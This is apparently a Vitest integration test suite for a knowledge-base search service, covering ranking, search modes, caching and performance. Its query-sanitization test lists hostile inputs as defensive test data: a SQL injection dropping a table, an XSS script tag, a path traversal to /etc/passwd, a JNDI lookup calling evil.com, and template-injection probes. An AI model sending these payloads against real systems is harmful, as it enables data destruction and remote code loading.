/**
 * Search and Ranking Integration Tests
 *
 * Tests comprehensive search and ranking functionality including:
 * - Full-text search across all knowledge types
 * - Confidence scoring and ranking algorithms
 * - Search mode variations (fast, auto, deep)
 * - Performance benchmarks
 * - Relevance and accuracy testing
 * - Query optimization and caching
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { dbPool } from '../../src/db/pool.js';
import { prisma } from '../../src/db/prisma-client.js';
import { memoryStore } from '../../src/services/memory-store.js';
import { memoryFind } from '../../src/services/memory-find.js';
import { smartMemoryFind } from '../../src/services/smart-find.js';

describe('Search and Ranking Integration Tests', () => {
  beforeAll(async () => {
    await dbPool.initialize();
    await prisma.initialize();
  });

  afterAll(async () => {
    // Cleanup all test data
    const cleanupTables = [
      'section', 'decision', 'issue', 'runbook', 'change_log',
      'adr_decision', 'knowledge_entity', 'knowledge_relation',
      'observation', 'todo', 'ddl', 'pr_context', 'incident',
      'release', 'release_note', 'risk', 'assumption'
    ];

    for (const table of cleanupTables) {
      try {
        await dbPool.query(`DELETE FROM ${table} WHERE tags @> '{"search_test": true}'::jsonb`);
      } catch (error) {
        // Table might not exist, continue
      }
    }
  });

  describe('Full-Text Search Functionality', () => {
    beforeEach(async () => {
      // Create test data for search
      const searchData = [
        {
          kind: 'section' as const,
          scope: { project: 'search-test', branch: 'main' },
          data: {
            title: 'Machine Learning Fundamentals',
            heading: 'Introduction to ML',
            body_text: 'Machine learning is a subset of artificial intelligence that focuses on algorithms and statistical models.'
          },
          tags: { search_test: true, content_test: true }
        },
        {
          kind: 'section' as const,
          scope: { project: 'search-test', branch: 'main' },
          data: {
            title: 'Deep Learning Architectures',
            heading: 'Neural Networks',
            body_text: 'Deep learning utilizes neural networks with multiple layers to learn hierarchical representations of data.'
          },
          tags: { search_test: true, content_test: true }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'search-test', branch: 'main' },
          data: {
            title: 'Adopt TensorFlow Framework',
            status: 'accepted',
            component: 'ml-platform',
            rationale: 'TensorFlow provides comprehensive tools for deep learning development and deployment.'
          },
          tags: { search_test: true, content_test: true }
        },
        {
          kind: 'entity' as const,
          scope: { project: 'search-test', branch: 'main' },
          data: {
            entity_type: 'algorithm',
            name: 'Gradient Descent',
            data: {
              type: 'optimization',
              description: 'Iterative optimization algorithm for finding minimum of function',
              applications: ['neural networks', 'regression', 'classification']
            }
          },
          tags: { search_test: true, content_test: true }
        },
        {
          kind: 'observation' as const,
          scope: { project: 'search-test', branch: 'main' },
          data: {
            content: 'Our experiments show that deep learning models outperform traditional machine learning approaches on image recognition tasks.',
            context: 'research findings'
          },
          tags: { search_test: true, content_test: true }
        }
      ];

      await memoryStore(searchData);
    });

    it('should perform basic full-text search', async () => {
      const searchResult = await memoryFind({
        query: 'machine learning',
        scope: { project: 'search-test', branch: 'main' }
      });

      expect(searchResult.hits.length).toBeGreaterThan(0);
      expect(searchResult.autonomous_metadata).toBeDefined();
      expect(searchResult.autonomous_metadata.strategy_used).toBeDefined();

      // Should find relevant results
      const titles = searchResult.hits.map(hit => hit.title || hit.name);
      expect(titles.some(title => title.includes('Machine Learning'))).toBe(true);
    });

    it('should handle phrase searches correctly', async () => {
      const phraseSearch = await memoryFind({
        query: '"deep learning"',
        scope: { project: 'search-test', branch: 'main' }
      });

      expect(phraseSearch.hits.length).toBeGreaterThan(0);

      // Results should contain the exact phrase
      const hasExactPhrase = phraseSearch.hits.some(hit =>
        (hit.snippet || hit.title || '').toLowerCase().includes('deep learning')
      );
      expect(hasExactPhrase).toBe(true);
    });

    it('should support boolean operators', async () => {
      const booleanSearch = await memoryFind({
        query: 'machine AND learning AND deep',
        scope: { project: 'search-test', branch: 'main' }
      });

      expect(booleanSearch.hits.length).toBeGreaterThan(0);

      // Results should be relevant to all terms
      booleanSearch.hits.forEach(hit => {
        const text = ((hit.snippet || '') + ' ' + (hit.title || '') + ' ' + (hit.name || '')).toLowerCase();
        expect(text).toMatch(/machine/);
        expect(text).toMatch(/learning/);
      });
    });

    it('should handle OR operator searches', async () => {
      const orSearch = await memoryFind({
        query: 'tensorflow OR gradient',
        scope: { project: 'search-test', branch: 'main' }
      });

      expect(orSearch.hits.length).toBeGreaterThan(0);

      // Results should contain either term
      orSearch.hits.forEach(hit => {
        const text = ((hit.snippet || '') + ' ' + (hit.title || '') + ' ' + (hit.name || '')).toLowerCase();
        expect(text.match(/tensorflow|gradient/)).toBeTruthy();
      });
    });

    it('should support negation in searches', async () => {
      const negationSearch = await memoryFind({
        query: 'learning -traditional',
        scope: { project: 'search-test', branch: 'main' }
      });

      expect(negationSearch.hits.length).toBeGreaterThan(0);

      // Results should contain 'learning' but not 'traditional'
      negationSearch.hits.forEach(hit => {
        const text = ((hit.snippet || '') + ' ' + (hit.title || '') + ' ' + (hit.name || '')).toLowerCase();
        expect(text).toMatch(/learning/);
        expect(text).not.toMatch(/traditional/);
      });
    });
  });

  describe('Search Mode Variations', () => {
    beforeEach(async () => {
      // Create comprehensive test data
      const comprehensiveData = Array.from({ length: 50 }, (_, i) => ({
        kind: ['section', 'decision', 'entity', 'observation'][i % 4] as const,
        scope: { project: 'search-modes-test', branch: 'main' },
        data: {
          title: `Search Test Item ${i}`,
          heading: i % 4 === 0 ? `Heading ${i}` : undefined,
          body_text: i % 4 === 0 ? `Content about algorithms, machine learning, and data processing techniques for item ${i}.` : undefined,
          status: i % 4 === 1 ? 'accepted' : undefined,
          component: i % 4 === 1 ? 'test-component' : undefined,
          rationale: i % 4 === 1 ? `Rationale for decision ${i} regarding optimization and performance.` : undefined,
          entity_type: i % 4 === 2 ? 'test_entity' : undefined,
          name: i % 4 === 2 ? `Entity ${i}` : undefined,
          content: i % 4 === 3 ? `Observation about search performance and algorithm efficiency for test case ${i}.` : undefined
        },
        tags: { search_test: true, modes_test: true, item_index: i }
      }));

      await memoryStore(comprehensiveData);
    });

    it('should handle fast search mode', async () => {
      const fastSearch = await memoryFind({
        query: 'algorithms machine learning',
        scope: { project: 'search-modes-test', branch: 'main' },
        mode: 'fast'
      });

      expect(fastSearch.hits.length).toBeGreaterThan(0);
      expect(fastSearch.autonomous_metadata.mode_executed).toBe('fast');

      // Fast search should prioritize exact matches
      fastSearch.hits.forEach(hit => {
        expect(hit.confidence).toBeGreaterThan(0.1);
      });
    });

    it('should handle deep search mode', async () => {
      const deepSearch = await memoryFind({
        query: 'optimization performance',
        scope: { project: 'search-modes-test', branch: 'main' },
        mode: 'deep'
      });

      expect(deepSearch.hits.length).toBeGreaterThan(0);
      expect(deepSearch.autonomous_metadata.mode_executed).toBe('deep');

      // Deep search should find more comprehensive results
      expect(deepSearch.hits.length).toBeGreaterThan(0);

      // Should include fuzzy matches and related concepts
      const hasRelatedTerms = deepSearch.hits.some(hit => {
        const text = ((hit.snippet || '') + ' ' + (hit.title || '') + ' ' + (hit.name || '')).toLowerCase();
        return text.match(/optimization|performance|efficient|algorithm/);
      });
      expect(hasRelatedTerms).toBe(true);
    });

    it('should use auto mode with intelligent routing', async () => {
      const autoSearch = await memoryFind({
        query: 'search test optimization',
        scope: { project: 'search-modes-test', branch: 'main' },
        mode: 'auto'
      });

      expect(autoSearch.hits.length).toBeGreaterThan(0);
      expect(autoSearch.autonomous_metadata.mode_executed).toBeDefined();
      expect(autoSearch.autonomous_metadata.strategy_used).toBeDefined();

      // Auto mode should choose appropriate strategy
      expect(['fast', 'deep', 'fast_then_deep_fallback']).toContain(autoSearch.autonomous_metadata.strategy_used);
    });

    it('should fallback between search modes when needed', async () => {
      // Test with ambiguous query that might need fallback
      const fallbackSearch = await memoryFind({
        query: 'xxyzzy', // Non-existent term that should trigger fallback
        scope: { project: 'search-modes-test', branch: 'main' },
        mode: 'auto'
      });

      expect(fallbackSearch.autonomous_metadata).toBeDefined();

      // Should handle gracefully even with no results
      expect(fallbackSearch.hits).toBeInstanceOf(Array);
      expect(fallbackSearch.autonomous_metadata.recommendation).toBeDefined();
    });
  });

  describe('Confidence Scoring and Ranking', () => {
    beforeEach(async () => {
      // Create data with varying relevance levels
      const rankingData = [
        {
          kind: 'section' as const,
          scope: { project: 'ranking-test', branch: 'main' },
          data: {
            title: 'Machine Learning Algorithms',
            heading: 'ML Algorithm Overview',
            body_text: 'Comprehensive guide to machine learning algorithms including supervised, unsupervised, and reinforcement learning.'
          },
          tags: { search_test: true, ranking_test: true, relevance: 'high' }
        },
        {
          kind: 'section' as const,
          scope: { project: 'ranking-test', branch: 'main' },
          data: {
            title: 'Data Processing Pipeline',
            heading: 'ETL Processes',
            body_text: 'Data extraction, transformation, and loading processes for machine learning workflows.'
          },
          tags: { search_test: true, ranking_test: true, relevance: 'medium' }
        },
        {
          kind: 'entity' as const,
          scope: { project: 'ranking-test', branch: 'main' },
          data: {
            entity_type: 'algorithm',
            name: 'Random Forest',
            data: {
              type: 'ensemble method',
              description: 'Machine learning algorithm that operates by constructing multiple decision trees.'
            }
          },
          tags: { search_test: true, ranking_test: true, relevance: 'high' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'ranking-test', branch: 'main' },
          data: {
            title: 'Adopt Cloud Infrastructure',
            status: 'accepted',
            component: 'infrastructure',
            rationale: 'Cloud infrastructure provides scalability for our machine learning workloads.'
          },
          tags: { search_test: true, ranking_test: true, relevance: 'low' }
        }
      ];

      await memoryStore(rankingData);
    });

    it('should rank results by relevance', async () => {
      const searchResult = await memoryFind({
        query: 'machine learning algorithms',
        scope: { project: 'ranking-test', branch: 'main' }
      });

      expect(searchResult.hits.length).toBeGreaterThan(1);

      // Results should be sorted by confidence score
      const scores = searchResult.hits.map(hit => hit.confidence);
      for (let i = 1; i < scores.length; i++) {
        expect(scores[i]).toBeLessThanOrEqual(scores[i - 1]);
      }

      // Most relevant result should have highest confidence
      const topResult = searchResult.hits[0];
      expect(topResult.confidence).toBeGreaterThan(0.5);
      expect(topResult.title || topResult.name).toMatch(/machine learning|algorithm/i);
    });

    it('should calculate confidence scores correctly', async () => {
      const searchResult = await memoryFind({
        query: 'machine learning',
        scope: { project: 'ranking-test', branch: 'main' }
      });

      searchResult.hits.forEach(hit => {
        expect(hit.confidence).toBeDefined();
        expect(hit.confidence).toBeGreaterThanOrEqual(0);
        expect(hit.confidence).toBeLessThanOrEqual(1);

        // Should include autonomous metadata
        expect(hit.autonomous_context).toBeDefined();
      });
    });

    it('should boost recent content appropriately', async () => {
      // Create some older content first
      await memoryStore([{
        kind: 'section',
        scope: { project: 'ranking-test', branch: 'main' },
        data: {
          title: 'Old Machine Learning Content',
          heading: 'Legacy ML',
          body_text: 'Old content about machine learning concepts.'
        },
        tags: { search_test: true, ranking_test: true, timestamp: 'old' }
      }]);

      // Wait a moment to ensure timestamp difference
      await new Promise(resolve => setTimeout(resolve, 10));

      // Create newer content
      await memoryStore([{
        kind: 'section',
        scope: { project: 'ranking-test', branch: 'main' },
        data: {
          title: 'New Machine Learning Content',
          heading: 'Modern ML',
          body_text: 'Recent content about machine learning advances and modern techniques.'
        },
        tags: { search_test: true, ranking_test: true, timestamp: 'new' }
      }]);

      const searchResult = await memoryFind({
        query: 'machine learning content',
        scope: { project: 'ranking-test', branch: 'main' }
      });

      // Newer content should rank higher for same relevance
      const newContent = searchResult.hits.find(hit => hit.title.includes('New'));
      const oldContent = searchResult.hits.find(hit => hit.title.includes('Old'));

      if (newContent && oldContent) {
        expect(newContent.confidence).toBeGreaterThanOrEqual(oldContent.confidence);
      }
    });

    it('should handle multi-factor ranking', async () => {
      const searchResult = await memoryFind({
        query: 'algorithms',
        scope: { project: 'ranking-test', branch: 'main' }
      });

      searchResult.hits.forEach(hit => {
        // Should have score components
        expect(hit.score).toBeDefined();
        expect(hit.autonomous_context).toBeDefined();

        // Should include ranking factors
        const context = hit.autonomous_context;
        expect(context).toBeDefined();
      });
    });
  });

  describe('Performance Benchmarks', () => {
    it('should handle large dataset searches efficiently', async () => {
      const itemCount = 1000;
      const batchSize = 50;

      // Create large dataset
      console.log(`Creating ${itemCount} test items...`);
      const startTime = Date.now();

      for (let batch = 0; batch < itemCount / batchSize; batch++) {
        const batchItems = Array.from({ length: batchSize }, (_, i) => {
          const globalIndex = batch * batchSize + i;
          return {
            kind: ['section', 'decision', 'entity', 'observation'][globalIndex % 4] as const,
            scope: { project: 'performance-test', branch: 'main' },
            data: {
              title: `Performance Test Item ${globalIndex}`,
              heading: globalIndex % 4 === 0 ? `Performance Heading ${globalIndex}` : undefined,
              body_text: globalIndex % 4 === 0 ? `Performance test content about algorithms, optimization, and scalability for item ${globalIndex}. This content includes various technical terms related to machine learning, data processing, and system performance.` : undefined,
              status: globalIndex % 4 === 1 ? 'accepted' : undefined,
              component: globalIndex % 4 === 1 ? 'performance-component' : undefined,
              rationale: globalIndex % 4 === 1 ? `Performance rationale for decision ${globalIndex} regarding system optimization and algorithm efficiency.` : undefined,
              entity_type: globalIndex % 4 === 2 ? 'performance_entity' : undefined,
              name: globalIndex % 4 === 2 ? `Performance Entity ${globalIndex}` : undefined,
              content: globalIndex % 4 === 3 ? `Performance observation about search speed, query optimization, and system responsiveness for test case ${globalIndex}.` : undefined
            },
            tags: { search_test: true, performance_test: true, batch_index: batch, item_index: globalIndex }
          };
        });

        await memoryStore(batchItems);
      }

      const creationTime = Date.now() - startTime;
      console.log(`Created ${itemCount} items in ${creationTime}ms`);

      // Test search performance
      const searchStartTime = Date.now();
      const searchResult = await memoryFind({
        query: 'performance optimization algorithm',
        scope: { project: 'performance-test', branch: 'main' },
        mode: 'auto'
      });
      const searchTime = Date.now() - searchStartTime;

      console.log(`Search completed in ${searchTime}ms, found ${searchResult.hits.length} results`);

      expect(searchResult.hits.length).toBeGreaterThan(0);
      expect(searchTime).toBeLessThan(5000); // Should complete within 5 seconds
      expect(creationTime).toBeLessThan(30000); // Should create data within 30 seconds
    });

    it('should maintain performance under concurrent searches', async () => {
      const concurrentSearches = 20;
      const searchQueries = [
        'algorithm optimization',
        'performance testing',
        'data processing',
        'machine learning',
        'system scalability'
      ];

      const searchPromises = Array.from({ length: concurrentSearches }, async (_, i) => {
        const query = searchQueries[i % searchQueries.length];
        const startTime = Date.now();
        const result = await memoryFind({
          query: `${query} test ${i}`,
          scope: { project: 'performance-test', branch: 'main' },
          mode: 'fast'
        });
        const duration = Date.now() - startTime;
        return { result, duration, query, index: i };
      });

      const concurrentStartTime = Date.now();
      const concurrentResults = await Promise.all(searchPromises);
      const totalDuration = Date.now() - concurrentStartTime;

      console.log(`Completed ${concurrentSearches} concurrent searches in ${totalDuration}ms`);

      // All searches should complete successfully
      expect(concurrentResults.length).toBe(concurrentSearches);
      concurrentResults.forEach(({ result, duration }) => {
        expect(result).toBeDefined();
        expect(result.hits).toBeInstanceOf(Array);
        expect(duration).toBeLessThan(3000); // Each search should complete within 3 seconds
      });

      // Total time should be reasonable for concurrent execution
      expect(totalDuration).toBeLessThan(10000); // All searches should complete within 10 seconds
    });

    it('should handle complex searches efficiently', async () => {
      const complexQueries = [
        'machine learning AND (algorithm OR optimization) NOT testing',
        '"performance testing" OR "scalability analysis"',
        'data AND (processing OR pipeline) AND (efficient OR optimized)',
        '(neural OR deep) AND learning AND (network OR architecture)',
        'system AND performance AND (scalability OR optimization OR efficiency)'
      ];

      const results = [];
      for (const query of complexQueries) {
        const startTime = Date.now();
        const searchResult = await memoryFind({
          query,
          scope: { project: 'performance-test', branch: 'main' },
          mode: 'auto'
        });
        const duration = Date.now() - startTime;

        results.push({ query, duration, resultCount: searchResult.hits.length });

        expect(searchResult.hits).toBeInstanceOf(Array);
        expect(duration).toBeLessThan(5000); // Each complex query should complete within 5 seconds
      }

      console.log('Complex query performance:');
      results.forEach(({ query, duration, resultCount }) => {
        console.log(`  "${query}": ${duration}ms, ${resultCount} results`);
      });

      // Average performance should be reasonable
      const avgDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
      expect(avgDuration).toBeLessThan(3000); // Average should be under 3 seconds
    });
  });

  describe('Query Optimization and Caching', () => {
    it('should cache frequent query results', async () => {
      const query = 'machine learning algorithms';

      // First search
      const firstStart = Date.now();
      const firstResult = await memoryFind({
        query,
        scope: { project: 'search-test', branch: 'main' },
        mode: 'auto'
      });
      const firstDuration = Date.now() - firstStart;

      // Second search (should be faster if cached)
      const secondStart = Date.now();
      const secondResult = await memoryFind({
        query,
        scope: { project: 'search-test', branch: 'main' },
        mode: 'auto'
      });
      const secondDuration = Date.now() - secondStart;

      console.log(`First search: ${firstDuration}ms, Second search: ${secondDuration}ms`);

      // Results should be identical
      expect(firstResult.hits.length).toBe(secondResult.hits.length);
      expect(firstResult.autonomous_metadata.strategy_used).toBe(secondResult.autonomous_metadata.strategy_used);

      // Second search might be faster (though not guaranteed due to system variability)
      expect(secondDuration).toBeLessThan(firstDuration + 1000); // Allow some variance
    });

    it('should optimize query execution plans', async () => {
      const queries = [
        { query: 'simple search terms', expectedComplexity: 'low' },
        { query: 'medium complexity search with multiple terms', expectedComplexity: 'medium' },
        { query: 'very complex search with AND OR NOT operators and (nested parentheses) OR "quoted phrases"', expectedComplexity: 'high' }
      ];

      const results = [];
      for (const { query, expectedComplexity } of queries) {
        const startTime = Date.now();
        const searchResult = await memoryFind({
          query,
          scope: { project: 'search-test', branch: 'main' },
          mode: 'auto'
        });
        const duration = Date.now() - startTime;

        results.push({
          query: query.substring(0, 30) + '...',
          duration,
          resultCount: searchResult.hits.length,
          complexity: expectedComplexity,
          strategy: searchResult.autonomous_metadata.strategy_used
        });

        // All queries should complete, regardless of complexity
        expect(searchResult.hits).toBeInstanceOf(Array);
        expect(duration).toBeLessThan(10000); // Even complex queries should complete
      }

      console.log('Query optimization results:');
      results.forEach(({ query, duration, complexity, strategy }) => {
        console.log(`  ${query} (${complexity}): ${duration}ms, strategy: ${strategy}`);
      });

      // Strategy should adapt to query complexity
      const complexQuery = results.find(r => r.complexity === 'high');
      const simpleQuery = results.find(r => r.complexity === 'low');

      if (complexQuery && simpleQuery) {
        // Complex queries might use different strategies
        expect(['fast', 'deep', 'fast_then_deep_fallback']).toContain(complexQuery.strategy);
        expect(['fast', 'deep', 'fast_then_deep_fallback']).toContain(simpleQuery.strategy);
      }
    });

    it('should handle search query sanitization', async () => {
      const maliciousQueries = [
        "'; DROP TABLE section; --",
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '[${7*7}]'
      ];

      for (const maliciousQuery of maliciousQueries) {
        const searchResult = await memoryFind({
          query: maliciousQuery,
          scope: { project: 'search-test', branch: 'main' },
          mode: 'auto'
        });

        // Should handle malicious input gracefully
        expect(searchResult.hits).toBeInstanceOf(Array);
        expect(searchResult.autonomous_metadata).toBeDefined();

        // Should not execute malicious commands
        expect(searchResult.errors).toBeUndefined();
      }
    });
  });

  describe('Search Accuracy and Relevance', () => {
    beforeEach(async () => {
      // Create domain-specific test data for accuracy testing
      const accuracyData = [
        {
          kind: 'section' as const,
          scope: { project: 'accuracy-test', branch: 'main' },
          data: {
            title: 'Introduction to Neural Networks',
            heading: 'Neural Network Basics',
            body_text: 'Neural networks are computing systems inspired by biological neural networks that constitute animal brains.'
          },
          tags: { search_test: true, accuracy_test: true, domain: 'ai' }
        },
        {
          kind: 'section' as const,
          scope: { project: 'accuracy-test', branch: 'main' },
          data: {
            title: 'Convolutional Neural Networks for Image Recognition',
            heading: 'CNN Architecture',
            body_text: 'CNNs are particularly effective for image processing and computer vision tasks due to their specialized architecture.'
          },
          tags: { search_test: true, accuracy_test: true, domain: 'ai' }
        },
        {
          kind: 'section' as const,
          scope: { project: 'accuracy-test', branch: 'main' },
          data: {
            title: 'Recurrent Neural Networks for Sequential Data',
            heading: 'RNN Applications',
            body_text: 'RNNs are designed to work with sequence data, making them ideal for natural language processing and time series analysis.'
          },
          tags: { search_test: true, accuracy_test: true, domain: 'ai' }
        },
        {
          kind: 'entity' as const,
          scope: { project: 'accuracy-test', branch: 'main' },
          data: {
            entity_type: 'framework',
            name: 'TensorFlow',
            data: {
              type: 'deep learning framework',
              description: 'Open-source library for machine learning and deep learning applications'
            }
          },
          tags: { search_test: true, accuracy_test: true, domain: 'tools' }
        },
        {
          kind: 'entity' as const,
          scope: { project: 'accuracy-test', branch: 'main' },
          data: {
            entity_type: 'algorithm',
            name: 'Backpropagation',
            data: {
              type: 'optimization algorithm',
              description: 'Method used to train neural networks by calculating gradients'
            }
          },
          tags: { search_test: true, accuracy_test: true, domain: 'algorithms' }
        }
      ];

      await memoryStore(accuracyData);
    });

    it('should find semantically similar content', async () => {
      const semanticSearch = await memoryFind({
        query: 'deep learning image classification',
        scope: { project: 'accuracy-test', branch: 'main' },
        mode: 'deep'
      });

      expect(semanticSearch.hits.length).toBeGreaterThan(0);

      // Should find CNN content even without exact term match
      const hasCNN = semanticSearch.hits.some(hit =>
        (hit.title || hit.name || '').toLowerCase().includes('convolutional') ||
        (hit.snippet || '').toLowerCase().includes('cnn')
      );
      expect(hasCNN).toBe(true);
    });

    it('should maintain precision in specific queries', async () => {
      const specificSearch = await memoryFind({
        query: '"Recurrent Neural Networks"',
        scope: { project: 'accuracy-test', branch: 'main' }
      });

      expect(specificSearch.hits.length).toBe(1);
      expect(specificSearch.hits[0].title).toBe('Recurrent Neural Networks for Sequential Data');
      expect(specificSearch.hits[0].confidence).toBeGreaterThan(0.8);
    });

    it('should balance precision and recall appropriately', async () => {
      const balancedSearch = await memoryFind({
        query: 'neural networks',
        scope: { project: 'accuracy-test', branch: 'main' },
        mode: 'auto'
      });

      expect(balancedSearch.hits.length).toBeGreaterThan(1);
      expect(balancedSearch.hits.length).toBeLessThan(10); // Should not be too broad

      // All results should be relevant
      balancedSearch.hits.forEach(hit => {
        const text = ((hit.snippet || '') + ' ' + (hit.title || '') + ' ' + (hit.name || '')).toLowerCase();
        expect(text).toMatch(/neural|network/);
      });

      // Should include different types of neural network content
      const titles = balancedSearch.hits.map(hit => hit.title || hit.name);
      const hasIntroduction = titles.some(t => t.includes('Introduction'));
      const hasCNN = titles.some(t => t.includes('Convolutional'));
      const hasRNN = titles.some(t => t.includes('Recurrent'));

      expect(hasIntroduction || hasCNN || hasRNN).toBe(true);
    });

    it('should provide relevant suggestions for ambiguous queries', async () => {
      const ambiguousSearch = await memoryFind({
        query: 'network',
        scope: { project: 'accuracy-test', branch: 'main' },
        mode: 'auto'
      });

      expect(ambiguousSearch.hits.length).toBeGreaterThan(0);
      expect(ambiguousSearch.autonomous_metadata.recommendation).toBeDefined();

      // Should suggest more specific queries
      const suggestion = ambiguousSearch.autonomous_metadata.user_message_suggestion;
      expect(suggestion).toBeDefined();
      expect(typeof suggestion).toBe('string');
    });

    it('should handle domain-specific terminology correctly', async () => {
      const domainSearch = await memoryFind({
        query: 'backpropagation gradient descent optimization',
        scope: { project: 'accuracy-test', branch: 'main' },
        mode: 'deep'
      });

      expect(domainSearch.hits.length).toBeGreaterThan(0);

      // Should find algorithm-related content
      const hasAlgorithm = domainSearch.hits.some(hit =>
        (hit.title || hit.name || '').toLowerCase().includes('backpropagation') ||
        (hit.snippet || '').toLowerCase().includes('gradient')
      );
      expect(hasAlgorithm).toBe(true);

      // Results should have high confidence for domain-specific terms
      expect(domainSearch.hits[0].confidence).toBeGreaterThan(0.5);
    });
  });
});